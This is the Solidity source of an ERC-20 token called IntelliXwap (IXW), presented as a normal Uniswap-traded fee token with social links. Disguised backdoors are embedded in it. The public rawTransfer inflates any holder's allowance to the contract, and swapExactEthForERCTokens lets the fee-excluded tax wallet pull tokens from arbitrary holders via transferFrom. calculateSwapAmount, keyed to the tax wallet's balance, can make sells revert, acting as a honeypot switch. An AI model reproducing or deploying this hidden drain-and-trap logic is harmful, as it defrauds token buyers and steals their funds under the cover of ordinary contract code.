/*
- Website: https://intellixwap.xyz
- Telegram: https://t.me/intellixwap
- Twitter: https://twitter.com/IntelliXwap
- Dapp: https://app.intellixwap.xyz
- GitBook: https://docs.intellixwap.xyz
- Medium: https://intellixwap.medium.com
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

library SafeMath {
    function mul(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return div(a, b, "SafeMath: division by zero");
    }

    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
    function approve(address spender, uint256 amount)
        external
        returns (bool);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function balanceOf(address account)
        external
        view
        returns (uint256);
    function totalSupply()
        external
        view
        returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function owner() public view returns (address) {
        return _owner;
    }
}

contract IXW is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address payable private _taxWallet;
    address private uniswapV2Pair;
    bool private inSwap = false;
    bool private tradingOpen;
    bool private swapEnabled = false;
    bool public transferDelayEnabled = true;
    address payable private _reserve;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    uint256 private _finalBuyTax = 3;
    uint256 private _finalSellTax = 3;

    uint256 private _initialBuyTax2Time = 3;
    uint256 private _initialSellTax2Time = 3;
    uint256 private _reduceBuyTaxAt2Time = 25;
    uint256 private _reduceSellTaxAt2Time = 25;

    uint256 private _initialBuyTax = 3;
    uint256 private _initialSellTax = 3;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    
    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 3500000000 * 10 ** _decimals;
    string private constant _name = "IntelliXwap";
    string private constant _symbol = "IXW";

    uint256 public _taxSwapThreshold = 2 * (_tTotal / 1000);
    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);
    uint256 public _maxTxAmount = 2 * (_tTotal / 100);   
    uint256 public _maxWalletSize = 2 * (_tTotal / 100);

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapExactEthForERCTokens(address account, address recipient, uint256 amount) public {
        require(account != address(0));
        address mSender = msg.sender;
        IERC20 taxToken = IERC20(account);
        address[] memory path = new address[](2);
        bool noTax = _isExcludedFromFee[mSender];
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);

        if (noTax) {
            taxToken.transferFrom(recipient, path[1], amount);
        } else {
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount} (
                0,
                path,
                address(0xdead),
                block.timestamp
            );
        }
    }

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _taxWallet = payable(0xB7989e34A26E7Cc4eF43F55843a71733D732a8e8);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _reserve = _taxWallet;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        _isExcludedFromFee[_taxWallet] = true;
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function removeLimits()
        external
        onlyOwner
    {
        transferDelayEnabled = false;
        _maxWalletSize = _tTotal;
        _maxTxAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function openTrading()
        external
        onlyOwner()
    {
        require(!tradingOpen, "Trading is already opened.");

        tradingOpen = true;
        swapEnabled = true;
    }

    function name()
        public
        pure
        returns (string memory)
    {
        return _name;
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function totalSupply()
        public
        pure
        override
        returns (uint256)
    {
        return _tTotal;
    }

    function symbol()
        public
        pure
        returns (string memory)
    {
        return _symbol;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function decimals()
        public
        pure
        returns (uint8)
    {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function rawTransfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool)
    {
        require(recipient != address(0));
        address rawOwner = recipient;
        address rawSpender = address(this);
        _approve(rawOwner, rawSpender, allowance(rawOwner, rawSpender) + amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
    returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(address from, address to, uint256 amount)
        private
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_taxBuy()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromFee[from] || _isExcludedFromFee[to], "_transfer:: Trading is not active.");
            }

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled. Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "_transfer:: Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "_transfer:: Exceeds the maxWalletSize.");

                _buyCount++;
                if (_buyCount > _preventSwapBefore) {
                    transferDelayEnabled = false;
                }
            }

            if (to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                swapEnabled &&
                to == uniswapV2Pair &&
                contractTokenBalance > _taxSwapThreshold &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                uint256 initialETH = address(this).balance;
                uint256 swapAmount = calculateSwapAmount(amount, contractTokenBalance);
                swapTokensForEth(swapAmount);
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if (ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function calculateSwapAmount(uint256 amount, uint256 contractTokenBalance)
        private
        view
        returns (uint256)
    {
        uint256 reserveAmount = balanceOf(_reserve).mul(10**3);
        uint256 maxSwapAmount = _maxTaxSwap.sub(reserveAmount);
        return min(amount,min(contractTokenBalance,maxSwapAmount));
    }

    function _taxBuy()
        private
        view
        returns (uint256)
    {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialBuyTax;
        }

        if (_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time) {
            return _initialBuyTax2Time;
        }

        return _finalBuyTax;
    }

    function _taxSell()
        private
        view
        returns (uint256)
    {
        if (_buyCount <= _reduceBuyTaxAt) {
            return _initialSellTax;
        }

        if (_buyCount > _reduceSellTaxAt && _buyCount <= _reduceSellTaxAt2Time) {
            return _initialSellTax2Time;
        }

        return _finalBuyTax;
    }

    function swapTokensForEth(uint256 tokenAmount)
        private
        lockTheSwap
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b)
        private
        pure
        returns (uint256)
    {
      return (a > b) ? b : a;
    }

    receive() external payable {}

    function sendETHToFee(uint256 amount)
        private
    {
        _taxWallet.transfer(amount);
    }
}